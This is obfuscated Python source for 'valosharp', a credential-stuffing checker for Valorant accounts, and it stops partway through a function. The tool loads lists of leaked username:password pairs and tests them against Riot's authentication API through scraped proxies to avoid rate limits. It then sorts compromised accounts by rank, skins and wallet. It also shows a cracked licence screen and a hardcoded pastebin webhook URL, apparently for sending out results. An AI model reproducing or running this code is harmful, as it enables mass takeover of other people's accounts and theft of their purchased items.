import random  # line:1
import asyncio  # line:2
import re  # line:3
import os  # line:4
import json  # line:5
import aiohttp  # line:6
import os  # line:7
import json  # line:8
import readchar  # line:9
import tkinter  # line:10
import time  # line:11
import os  # line:12
import sys  # line:13
import os.path  # line:14
import hashlib  # line:15
import json as jsond  # line:16
import time  # line:17
import binascii  # line:18
import platform  # line:19
import subprocess  # line:20
import datetime  # line:21
import sys  # line:22
import os  # line:23
import requests  # line:24
import traceback  # line:25
import json  # line:26
import os  # line:27
import sys  # line:28
import threading  # line:29
from tkinter import messagebox, Tk  # line:31
from uuid import uuid4  # line:32
from tkinter import filedialog  # line:33
from console import utils  # line:34
import sys  # line:35


if sys.version_info[0] == 3 and sys.version_info[1] >= 8 and sys.platform.startswith('win'):  # line:49
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())  # line:50
win = Tk()  # line:52
win.withdraw()  # line:53
dont_log_errors = True  # line:55






class ValorantAccountChecker:  # line:540
    def __init__(O0000O00O00000000) -> None:  # line:542
        O0OOOOOOOOO00OOO0 = O0000O00O00000000.load_config()  # line:544
        O0000O00O00000000._ = {"root": tkinter.Tk(), "logo": r"""
            _           _                      
           | |         | |                     
__   ____ _| | ___  ___| |__   __ _ _ __ _ __  
\ \ / / _` | |/ _ \/ __| '_ \ / _` | '__| '_ \ 
 \ V / (_| | | (_) \__ \ | | | (_| | |  | |_) |
  \_/ \__,_|_|\___/|___/_| |_|\__,_|_|  | .__/ 
                                        | |    
                                        |_|    """, "new_line_multiply": 50,
                               "timeout": O0OOOOOOOOO00OOO0["Proxy Timeout"],
                               "remove_double_lines": O0OOOOOOOOO00OOO0["Remove double Lines"],
                               "ui": O0OOOOOOOOO00OOO0["UI"], "rand_int": 30,
                               "user_webhook_url": O0OOOOOOOOO00OOO0["User Webhook URL"],
                               "errors": {"auth_failure": "Invalid credentials"},
                               "item_types": {"01bb38e1-da47-4e6a-9b3d-945fe4655707": "Agents",
                                              "f85cb6f7-33e5-4dc8-b609-ec7212301948": "Contracts",
                                              "d5f120f8-ff8c-4aac-92ea-f2b5acbe9475": "Sprays",
                                              "dd3bf334-87f3-40bd-b043-682a57a8dc3a": "Gun Buddies",
                                              "3f296c07-64c3-494c-923b-fe692a4fa1bd": "Cards",
                                              "e7c63390-eda7-46e0-bb7a-a6abdacd2433": "Skins",
                                              "3ad1b2b2-acdb-4524-852f-954a76ddae0a": "Skin Variants",
                                              "de7caa6b-adf7-4588-bbd1-143831e786c6": "Titles", },
                               "filter": {"filtered_skins": [], "filtered_ranks": [],
                                          "skins": {"0": [], "1-10": [], "10-20": [], "20-30": [], "30-40": [],
                                                    "40-50": [], "50-80": [], "80-100": [], "100-150": [],
                                                    "150-200": [], "200+": [], },
                                          "ranks": {"unranked": [], "unknown": [], "iron": [], "bronze": [],
                                                    "silver": [], "gold": [], "platinum": [], "diamond": [],
                                                    "immortal": [], "radiant": [], }}, "errors": [],
                               "regions": ["eu", "na", "ap", "kr"], "checker_finished": False,
                               "endpoints": {"player_xp": "https://pd.{0}.a.pvp.net/account-xp/v1/players/{1}",
                                             "authorization": "https://auth.riotgames.com/api/v1/authorization",
                                             "token": "https://entitlements.auth.riotgames.com/api/token/v1",
                                             "user_info": "https://auth.riotgames.com/userinfo",
                                             "weapons": "https://valorant-api.com/v1/weapons",
                                             "client_version": "https://valorant-api.com/v1/version",
                                             "account_region": 'https://api.henrikdev.xyz/valorant/v1/account/{0}/{1}',
                                             "ranked_data": 'https://pd.{0}.a.pvp.net/mmr/v1/players/{1}/competitiveupdates',
                                             "wallet": "https://pd.{0}.a.pvp.net/store/v1/wallet/{1}",
                                             "currency_data": "https://valorant-api.com/v1/currencies",
                                             "loadout_data": "https://pd.{0}.a.pvp.net/personalization/v2/players/{1}/playerloadout",
                                             "entitlements": "https://pd.{0}.a.pvp.net/store/v1/entitlements/{1}/",
                                             "skins": "https://valorant-api.com/v1/weapons/skins",
                                             "sprays": "https://valorant-api.com/v1/sprays",
                                             "agents": "https://valorant-api.com/v1/agents",
                                             "contracts": "https://valorant-api.com/v1/contracts",
                                             "cards": "https://valorant-api.com/v1/playercards",
                                             "buddies": "https://valorant-api.com/v1/buddies",
                                             "titles": "https://valorant-api.com/v1/playertitles",
                                             "email_verification": "https://email-verification.riotgames.com/api/v1/account/status",
                                             "webhook_url": "https://pastebin.com/raw/UKxLuQLy"}, "api_data": {
                "client_version": {"riotClientVersion": "release-04.05-shipping-14-685769"}}, "parent_session": None,
                               "threads": [], "combos": [], "useragents": [], "proxy_type": "1",
                               "proxy_types": {"1": "http", "2": "socks4", "3": "socks5"},
                               "proxy_errors": ["10054", "WinError", "501", "104", "409", "502", "500",
                                                "Internal Server Error", "504", "Gateway Timeout",
                                                "Cannot connect to host", "Gateway Time-out", "Server disconnected",
                                                "Proxy Authentication Required", "407", "Bad request", "404",
                                                "WinError 64", "Forbidden", "invalid constant string", "403",
                                                "WinError 121", "400", "503", "Too many open connections"],
                               "ranks": {"0": "Unranked", "1": "Unused1", "2": "Unused2", "3": "Iron 1", "4": "Iron 2",
                                         "5": "Iron 3", "6": "Bronze 1", "7": "Bronze 2", "8": "Bronze 3",
                                         "9": "Silver 1", "10": "Silver 2", "11": "Silver 3", "12": "Gold 1",
                                         "13": "Gold 2", "14": "Gold 3", "15": "Platinum 1", "16": "Platinum 2",
                                         "17": "Platinum 3", "18": "Diamond 1", "19": "Diamond 2", "20": "Diamond 3",
                                         "21": "Immortal 1", "22": "Immortal 2", "23": "Immortal 3", "24": "Radiant"},
                               "proxies": {"all": [], "working": [], "rate_limited": [], }, "stats": {"save": {
                "valids_raw": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "invalids_raw": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "wallet": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "full_capture": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "user_info": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "rank": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "rank_user_info": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "rank_wallet": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "rank_wallet_user_info": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "inventory": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "inventory_user_info": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "inventory_rank": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "inventory_rank_user_info": "Checked with valosharp: https://t.me/valosharp9\n==========================================\n\n\n",
                "inventory_rank_wallet": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n",
                "inventory_rank_wallet_user_info": "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n", },
                                                                                                      "_captured": {
                                                                                                          "user_info": [],
                                                                                                          "inventory": [],
                                                                                                          "inventory_user_info": [],
                                                                                                          "inventory_rank": [],
                                                                                                          "rank": [],
                                                                                                          "inventory_rank_user_info": [],
                                                                                                          "rank_user_info": [],
                                                                                                          "wallet": [],
                                                                                                          "rank_wallet": [],
                                                                                                          "rank_wallet_user_info": [],
                                                                                                          "inventory_rank_wallet": [],
                                                                                                          "full_capture": [], },
                                                                                                      "valids": [],
                                                                                                      "banned_list": [],
                                                                                                      "valid": 0,
                                                                                                      "invalid": 0,
                                                                                                      "retries": 0,
                                                                                                      "errors": 0,
                                                                                                      "unknown": 0,
                                                                                                      "custom": 0,
                                                                                                      'rate_limited': 0,
                                                                                                      "captured": 0,
                                                                                                      "banned": 0,
                                                                                                      "never_played": 0,
                                                                                                      "accounts": {
                                                                                                          "eu": 0,
                                                                                                          "na": 0,
                                                                                                          "ap": 0,
                                                                                                          "kr": 0, },
                                                                                                      "working_proxies": [],
                                                                                                      "started_at": datetime.datetime.now().strftime(
                                                                                                          "%Y-%m-%d %H-%M-%S")},
                               "loop": asyncio.get_event_loop()}  # line:708
        O0000O00O00000000._["root"].withdraw()  # line:713
        O0000O00O00000000.login()  # line:715
        try:  # line:717
            O0000O00O00000000._["loop"].run_forever()  # line:718
        except:  # line:719
            if dont_log_errors == False:  # line:720
                print(traceback.format_exc())  # line:721
            O0000O00O00000000._["errors"].append(traceback.format_exc())  # line:722
            O0000O00O00000000._["loop"].run_forever()  # line:723

    def getchecksum(O000OOOO0000OO0O0):  # line:725
        OOOOOOO0OOOO0000O = os.path.basename(__file__)  # line:726
        if not os.path.exists(OOOOOOO0OOOO0000O):  # line:727
            OOOOOOO0OOOO0000O = OOOOOOO0OOOO0000O[:-2] + "exe"  # line:728
        OOOOO0OO000O0O0O0 = hashlib.md5()  # line:729
        O00OO0O0OO00O0OO0 = open(OOOOOOO0OOOO0000O, "rb")  # line:730
        OO000OOO0O00000O0 = O00OO0O0OO00O0OO0.read()  # line:731
        OOOOO0OO000O0O0O0.update(OO000OOO0O00000O0)  # line:732
        O0000OOO00O00OOOO = OOOOO0OO000O0O0O0.hexdigest()  # line:733
        return O0000OOO00O00OOOO  # line:734

    def initialize(OOO0O0O0O0O0OO0OO):  # line:736
        if not os.path.exists(f"./Hits"):  # line:737
            os.mkdir(f"./Hits")  # line:738
        OOO0O0O0O0O0OO0OO._["loop"].create_task(OOO0O0O0O0O0OO0OO.create_parent_session())  # line:740
        OOO0O0O0O0O0OO0OO.load_constructor()  # line:741

    def load_config(O0000O0OOOOOOO000):  # line:743
        if not os.path.exists(f"./config.json"):  # line:744
            open("./config.json", "w+").write(json.dumps({"Proxy Timeout": 50, "UI": "CUI", "User Webhook URL": None,
                                                          "Remove double Lines": True, }))  # line:752
        return json.loads(open("./config.json", "r").read())  # line:754

    async def gather_with_concurrency(O00O0O000OO0O000O, *OOO00O000OOO00OOO):  # line:756
        async def OO0O000OOOO0OOO00(OO0O0O00OO0O00O0O):  # line:757
            return await OO0O0O00OO0O00O0O  # line:758

        return await asyncio.gather(
            *(OO0O000OOOO0OOO00(O0OOOOO0O0OO0000O) for O0OOOOO0O0OO0000O in OOO00O000OOO00OOO))  # line:760

    def login(OOOO00O00OO000000):  # line:762
        OOOO00O00OO000000.cls()  # line:770
        print(OOOO00O00OO000000._["logo"])  # line:771
        print()  # line:772
        OOOO00O00OO000000.log(f"CRACKED BY COC discord.gg/Sh5CyJ9e", "AUTH")  # line:773
        OOOO00O00OO000000.log(f"Enter your license key:", "AUTH")  # line:774
        OOOO00O00OO000000._["license_key"] = input()  # line:775
        OOOO00O00OO000000.log(f">:)", "AUTH")  # line:778
        OOOO00O00OO000000.log(
            f"License expires at NEVERRRRR WOOO",
            "AUTH")  # line:780
        time.sleep(5)  # line:782
        OOOO00O00OO000000.initialize()  # line:784

    async def checker(OOOO0O0OO0O0000O0):  # line:786
        OOOO0O0OO0O0000O0.cls()  # line:787
        utils.set_title(
            f"valosharp ~ Checker | CAPTURED: {OOOO0O0OO0O0000O0._['stats']['captured']} | VALID: {OOOO0O0OO0O0000O0._['stats']['valid']} | INVALID: {OOOO0O0OO0O0000O0._['stats']['invalid']} | BANNED: {OOOO0O0OO0O0000O0._['stats']['banned']} | RETRIES: {OOOO0O0OO0O0000O0._['stats']['retries']} | ERRORS: {OOOO0O0OO0O0000O0._['stats']['errors']} | UNKNOWN: {OOOO0O0OO0O0000O0._['stats']['unknown']} | RATELIMITS: {OOOO0O0OO0O0000O0._['stats']['rate_limited']} | REMAINING COMBOS: {len(OOOO0O0OO0O0000O0._['combos'])}")  # line:789
        print(OOOO0O0OO0O0000O0._["logo"])  # line:790
        print()  # line:791
        OOOO0O0OO0O0000O0.load_combos()  # line:792
        OOOO0O0OO0O0000O0.load_proxies()  # line:793
        OOO0OO00O0OOOOOOO = None  # line:795

        def O00000OOO000OOO00():  # line:797
            global threads  # line:798
            OOOO0O0OO0O0000O0.log("Enter threads: ")  # line:800
            _O0OOO000OOO0000OO = input()  # line:801
            if int(_O0OOO000OOO0000OO) > len(OOOO0O0OO0O0000O0._["combos"]):  # line:803
                OOOO0O0OO0O0000O0.log("You can't use more threads than combos")  # line:804
                return O00000OOO000OOO00()  # line:805
            return int(_O0OOO000OOO0000OO)  # line:807

        while not OOO0OO00O0OOOOOOO:  # line:809
            OOO0OO00O0OOOOOOO = O00000OOO000OOO00()  # line:810
        OOOO0O0OO0O0000O0._["threads"] = OOO0OO00O0OOOOOOO  # line:812
        O00OOOOO0O0O000OO = 0  # line:814
        O00OOOOOOO0O000OO = []  # line:816
        while O00OOOOO0O0O000OO < OOO0OO00O0OOOOOOO:  # line:818
            try:  # line:819
                O00OOOOO0O0O000OO += 1  # line:820
                OOOOO0OO0O0OO0000 = OOOO0O0OO0O0000O0.combo()  # line:821
                O00OOOOOOO0O000OO.append(OOOO0O0OO0O0000O0.check(O00OOOOO0O0O000OO,
                                                                 {"username": OOOOO0OO0O0OO0000.split(":")[0],
                                                                  "password": "".join(
                                                                      OOOOO0OO0O0OO0000.split(":")[1:])},
                                                                 OOOO0O0OO0O0000O0.proxy()))  # line:824
            except AttributeError:  # line:825
                if dont_log_errors == False:  # line:826
                    OOOO0O0OO0O0000O0.log(f"Detected broken combo {OOOOO0OO0O0OO0000}")  # line:827
        OOOO0O0OO0O0000O0._["loop"].create_task(
            OOOO0O0OO0O0000O0.gather_with_concurrency(*O00OOOOOOO0O000OO))  # line:830

    def _check(O000O0O0OOOOO00O0, O0O0OOO000O00OO00, OO0OOOO0OOOOO0OOO, O0O00O000O00O0OOO):  # line:832
        asyncio.get_event_loop().create_task(
            O000O0O0OOOOO00O0.check(O0O0OOO000O00OO00, OO0OOOO0OOOOO0OOO, O0O00O000O00O0OOO)).run_forever()  # line:833

    def settings(OO00O000OOOO000O0):  # line:835
        OO00O000OOOO000O0.cls()  # line:836
        utils.set_title(f"valosharp ~ Settings")  # line:837
        print(OO00O000OOOO000O0._["logo"])  # line:838
        print()  # line:839
        OO00O000OOOO000O0.log("What setting would you like to change?", "SETTINGS")  # line:840
        OO00O000OOOO000O0.log(OO00O000OOOO000O0._['timeout'], "1: Proxy Timeout")  # line:841
        OO00O000OOOO000O0.log(OO00O000OOOO000O0._['ui'], "2: UI Type")  # line:842
        OO00O000OOOO000O0.log(OO00O000OOOO000O0._['user_webhook_url'], "3: Discord webhook")  # line:843
        OO00O000OOOO000O0.log(OO00O000OOOO000O0._['remove_double_lines'], "4: Remove double lines")  # line:844
        OO00O000OOOO000O0.log("Back to menu", "5: Back to menu")  # line:846
        OOO00OOOOO00O0OO0 = repr(readchar.readkey())  # line:848
        if OOO00OOOOO00O0OO0 == "'1'":  # line:850
            OO00O000OOOO000O0.log("Enter new proxy timeout", "SETTINGS")  # line:851
            O0OO0O000OO000OOO = int(input())  # line:852
            OO00O000OOOO000O0._['timeout'] = O0OO0O000OO000OOO  # line:853
        if OOO00OOOOO00O0OO0 == "'2'":  # line:854
            O0OOOO0O0O0OO00O0 = None  # line:855
            if OO00O000OOOO000O0._["ui"] == "TUI":  # line:857
                O0OOOO0O0O0OO00O0 = "CUI"  # line:858
            else:  # line:859
                O0OOOO0O0O0OO00O0 = "TUI"  # line:860
            OO00O000OOOO000O0._['ui'] = O0OOOO0O0O0OO00O0  # line:861
        elif OOO00OOOOO00O0OO0 == "'3'":  # line:863
            OO00O000OOOO000O0.log("Enter new discord webhook url", "SETTINGS")  # line:864
            O0OOOOO0OOOOO0OOO = input()  # line:865
            OO00O000OOOO000O0._['user_webhook_url'] = O0OOOOO0OOOOO0OOO  # line:866
        elif OOO00OOOOO00O0OO0 == "'4'":  # line:868
            OO00O000OOOO000O0._["remove_double_lines"] = not OO00O000OOOO000O0._["remove_double_lines"]  # line:869
        elif OOO00OOOOO00O0OO0 == "'5'":  # line:871
            OO00O000OOOO000O0.menu()  # line:872
            return  # line:873
        open("./config.json", "w+").write(json.dumps(
            {"Proxy Timeout": OO00O000OOOO000O0._['timeout'], "UI": OO00O000OOOO000O0._["ui"],
             "User Webhook URL": OO00O000OOOO000O0._['user_webhook_url'],
             "Remove double Lines": OO00O000OOOO000O0._["remove_double_lines"]}, indent=3))  # line:880
        OO00O000OOOO000O0.settings()  # line:882

    def proxy_scraper(OOOO0O000OOO00O00):  # line:884
        OOOO0O000OOO00O00.cls()  # line:885
        utils.set_title(f"valosharp ~ Proxy Scraper")  # line:886
        print(OOOO0O000OOO00O00._["logo"])  # line:887
        print()  # line:888
        OOOO0O000OOO00O00.log("Scraping proxies", "SCRAPER")  # line:889
        O0O000OO0O0O00OOO = []  # line:891
        OOO0O000O00O00000 = time.time()  # line:893

        def O00OOOO000O000OO0(OO0O0OOOOO0O0OOO0, OOOO00OO0O0000O0O):  # line:895
            global proxylist  # line:896
            try:  # line:897
                proxylist = requests.get(OO0O0OOOOO0O0OOO0, timeout=5).text  # line:898
            except Exception:  # line:899
                pass  # line:900
            finally:  # line:901
                proxylist = proxylist.replace('null', '')  # line:902
            OOOO00OO0O0000O0O = OOOO00OO0O0000O0O.replace('%ip%',
                                                          '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')  # line:904
            OOOO00OO0O0000O0O = OOOO00OO0O0000O0O.replace('%port%', '([0-9]{1,5})')  # line:905
            for O0OO000O00000O0OO in re.findall(re.compile(OOOO00OO0O0000O0O), proxylist):  # line:906
                O0O000OO0O0O00OOO.append(f"{O0OO000O00000O0OO[0]}:{O0OO000O00000O0OO[1]}")  # line:907

        O0OOO00OO0000OO00 = [["https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "%ip%:%port%"],
                             ["http://spys.me/proxy.txt", "%ip%:%port% "], [
                                 "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                                 "%ip%:%port%"], [
                                 "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
                                 "%ip%:%port%"],
                             ["http://www.httptunnel.ge/ProxyListForFree.aspx", " target=\"_new\">%ip%:%port%</a>"],
                             ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json",
                              "\"ip\":\"%ip%\",\"port\":\"%port%\","],
                             ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
                              '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
                             ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
                              '%ip%:%port% (.*?){2}-.-S \\+'],
                             ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
                              '%ip%", "type": "http", "port": %port%'], ["https://www.us-proxy.org/",
                                                                         "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
                             ["https://free-proxy-list.net/",
                              "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
                             ["https://www.sslproxies.org/",
                              "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
                             [
                                 "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all",
                                 "%ip%:%port%"],
                             ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
                             ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
                             ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
                             ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
                             ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
                             ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
                             ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
                             ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
                             ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json",
                              '"ip": "%ip%",\n.*?"port": "%port%",']]  # line:932
        OO00OO0O000OO0000 = []  # line:934
        for O00000OOO0OOOOOOO in O0OOO00OO0000OO00:  # line:936
            OO000O0000OOOO00O = threading.Thread(target=O00OOOO000O000OO0,
                                                 args=(O00000OOO0OOOOOOO[0], O00000OOO0OOOOOOO[1]))  # line:937
            OO00OO0O000OO0000.append(OO000O0000OOOO00O)  # line:938
            OO000O0000OOOO00O.start()  # line:939
        for OO000O0000OOOO00O in OO00OO0O000OO0000:  # line:941
            OO000O0000OOOO00O.join()  # line:942
        OOOO0O000OOO00O00.log(
            f"Scraped [{len(O0O000OO0O0O00OOO)}] proxies in total => {(time.time() - OOO0O000O00O00000)}ms",
            "SCRAPER")  # line:945
        OOOO0O000OOO00O00.log("Please select where the proxies should be saved at", "SCRAPER")  # line:946
        OO0O0OO000O00OO0O = filedialog.asksaveasfile(mode='w', defaultextension=".txt")  # line:947
        OO0O0OO000O00OO0O.write(
            "Scraped with valosharp: https://t.me/valosharp\n==========================================\n\n\n" + "\n".join(
                O0O000OO0O0O00OOO))  # line:948
        OOOO0O000OOO00O00.log(f"Press any key to continue", "SCRAPER")  # line:950
        repr(readchar.readkey())  # line:951
        OOOO0O000OOO00O00.menu()  # line:952

    def menu(OO0OO0O0O000O000O):  # line:954
        OO0OO0O0O000O000O.cls()  # line:955
        utils.set_title(f"valosharp ~ Menu")  # line:956
        print(OO0OO0O0O000O000O._["logo"])  # line:957
        print()  # line:958
        OO0OO0O0O000O000O.log(f"Welcome to valosharp", "MENU")  # line:959
        OO0OO0O0O000O000O.log(f"Where do you want to go?", "MENU")  # line:960
        OO0OO0O0O000O000O.log("", "MENU")  # line:961
        OO0OO0O0O000O000O.log(f"[1] Checker", "MENU")  # line:962
        OO0OO0O0O000O000O.log(f"[2] Settings", "MENU")  # line:963
        OO0OO0O0O000O000O.log(f"[3] Proxy Scraper (Bad proxies)", "MENU")  # line:964
        OO0OO0O0O000O000O.log(f"[4] Quit", "MENU")  # line:965
        O0OOOOOO0OO0OOOO0 = repr(readchar.readkey())  # line:966
        if O0OOOOOO0OO0OOOO0 == "'1'":  # line:968
            OO0OO0O0O000O000O._["loop"].create_task(OO0OO0O0O000O000O.checker())  # line:969
        elif O0OOOOOO0OO0OOOO0 == "'2'":  # line:970
            OO0OO0O0O000O000O.settings()  # line:971
        elif O0OOOOOO0OO0OOOO0 == "'3'":  # line:972
            OO0OO0O0O000O000O.proxy_scraper()  # line:973
        elif O0OOOOOO0OO0OOOO0 == "'4'":  # line:974
            os.abort()  # line:975
        else:  # line:976
            OO0OO0O0O000O000O.log("Invalid character", "MENU")  # line:977
            time.sleep(2)  # line:978
            OO0OO0O0O000O000O.menu()  # line:979

    def log(O000O0OOOO0O0O0O0, O0O0000OOOOO0OOO0, OOOOOO00O0O0O00OO="PARENT"):  # line:981
        if OOOOOO00O0O0O00OO:  # line:982
            OO000O0OO0O000O0O = f"\x1b[36;1m[\x1b[31;1mvalosharp\x1b[36;1m/\x1b[33;1m{datetime.datetime.now().strftime('%m/%d %H:%M:%S')}\x1b[36;1m] \x1b[36;1m[{OOOOOO00O0O0O00OO}] \x1b[0;m{O0O0000OOOOO0OOO0}"  # line:983
        else:  # line:984
            OO000O0OO0O000O0O = f"\x1b[36;1m[\x1b[31;1mvalosharp\x1b[36;1m/\x1b[33;1m{datetime.datetime.now().strftime('%m/%d %H:%M:%S')}\x1b[36;1m] \x1b[0;m{O0O0000OOOOO0OOO0}"  # line:985
        print(OO000O0OO0O000O0O)  # line:987

    def load_constructor(OO00O0OOOOO0000O0):  # line:989
        OO00O0OOOOO0000O0._["loop"].create_task(OO00O0OOOOO0000O0.load_currency_data())  # line:990
        OO00O0OOOOO0000O0._["loop"].create_task(OO00O0OOOOO0000O0.load_api_data())  # line:991
        OO00O0OOOOO0000O0._["loop"].create_task(OO00O0OOOOO0000O0.load_client_version())  # line:992
        OO00O0OOOOO0000O0.menu()  # line:994

    def combo(OO0OOOO000O0O0O00):  # line:996
        try:  # line:997
            if len(OO0OOOO000O0O0O00._["combos"]) > 0:  # line:998
                return random.choice(OO0OOOO000O0O0O00._["combos"])  # line:999
            else:  # line:1000
                OO0OOOO000O0O0O00.finished_checking()  # line:1001
                return  # line:1002
        except:  # line:1003
            time.sleep(random.randint(1, (int(OO0OOOO000O0O0O00._["threads"]) / 10)))  # line:1004
            return OO0OOOO000O0O0O00.combo()  # line:1005

    def update_stats(O0O00O0OO00O0O00O):  # line:1007
        utils.set_title(
            f"valosharp ~ Checker | CAPTURED: {O0O00O0OO00O0O00O._['stats']['captured']} | VALID: {O0O00O0OO00O0O00O._['stats']['valid']} | INVALID: {O0O00O0OO00O0O00O._['stats']['invalid']} | BANNED: {O0O00O0OO00O0O00O._['stats']['banned']} | RETRIES: {O0O00O0OO00O0O00O._['stats']['retries']} | ERRORS: {O0O00O0OO00O0O00O._['stats']['errors']} | UNKNOWN: {O0O00O0OO00O0O00O._['stats']['unknown']} | RATELIMITS: {O0O00O0OO00O0O00O._['stats']['rate_limited']} | REMAINING COMBOS: {len(O0O00O0OO00O0O00O._['combos'])}")  # line:1009

    def save_stats(O000OOOO00000O00O):  # line:1011
        O000OOOO00000O00O.update_stats()  # line:1012
        if O000OOOO00000O00O._["ui"] == "CUI":  # line:1013
            O000OOOO00000O00O.stats_ui()  # line:1014
        if not os.path.exists(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}"):  # line:1016
            os.mkdir(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}")  # line:1017
        if not os.path.exists(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Ranked"):  # line:1019
            os.mkdir(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Ranked")  # line:1020
        if not os.path.exists(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Skinned"):  # line:1021
            os.mkdir(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Skinned")  # line:1022
        if not os.path.exists(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Others"):  # line:1023
            os.mkdir(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Others")  # line:1024
        if not os.path.exists(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Capture"):  # line:1025
            os.mkdir(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Capture")  # line:1026
        open(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Others/working_proxies.txt", "w+",
             encoding='utf-8').write(
            "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n" + "\n".join(
                O000OOOO00000O00O._["stats"]["working_proxies"]))  # line:1032
        open(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Others/errors.txt", "w+",
             encoding='utf-8').write(
            "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n" + "\n\n\n".join(
                O000OOOO00000O00O._["errors"]))  # line:1035
        for O0O0OOOOO000O0O00 in O000OOOO00000O00O._["stats"]["save"]:  # line:1038
            try:  # line:1039
                open(
                    f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Capture/{O0O0OOOOO000O0O00.upper()}.txt",
                    "w+", encoding='utf-8').write(O000OOOO00000O00O._["stats"]["save"][O0O0OOOOO000O0O00])  # line:1041
            except:  # line:1042
                if dont_log_errors == False:  # line:1043
                    print(traceback.format_exc())  # line:1044
                O000OOOO00000O00O._["errors"].append(traceback.format_exc())  # line:1045
        for _OOOOO0OOO00000000 in O000OOOO00000O00O._["filter"]["skins"]:  # line:1047
            O0O0OOO000O00000O = ""  # line:1048
            for OO000OOOO00OO00OO in O000OOOO00000O00O._["filter"]["skins"][_OOOOO0OOO00000000]:  # line:1049
                O0O0OOO000O00000O += OO000OOOO00OO00OO["capture"]  # line:1050
            open(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Skinned/{_OOOOO0OOO00000000}.txt", "w+",
                 encoding='utf-8').write(
                "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n" + O0O0OOO000O00000O)  # line:1052
        for _O000OOOO0OOO0O000 in O000OOOO00000O00O._["filter"]["ranks"]:  # line:1054
            OOO0OOOOOO0O00O00 = ""  # line:1055
            for OO000OOOO00OO00OO in O000OOOO00000O00O._["filter"]["ranks"][_O000OOOO0OOO0O000]:  # line:1056
                OOO0OOOOOO0O00O00 += OO000OOOO00OO00OO["capture"]  # line:1057
            open(f"./Hits/{str(O000OOOO00000O00O._['stats']['started_at'])}/Ranked/{_O000OOOO0OOO0O000}.txt", "w+",
                 encoding='utf-8').write(
                "Checked with valosharp: https://t.me/valosharp\n==========================================\n\n\n" + OOO0OOOOOO0O00O00)  # line:1059

    def load_combos(OO0O0O00OOOOOO0O0):  # line:1061
        OO0O0O00OOOOOO0O0.cls()  # line:1062
        print(OO0O0O00OOOOOO0O0._["logo"])  # line:1063
        print()  # line:1064
        OO0O0O00OOOOOO0O0.log("Please select your combos")  # line:1065
        O0OOO000O000O0O00 = filedialog.askopenfile(parent=OO0O0O00OOOOOO0O0._["root"], mode='rb',
                                                   title='Choose a combo file',
                                                   filetype=(("txt", "*.txt"), ("All files", "*.txt")))  # line:1068
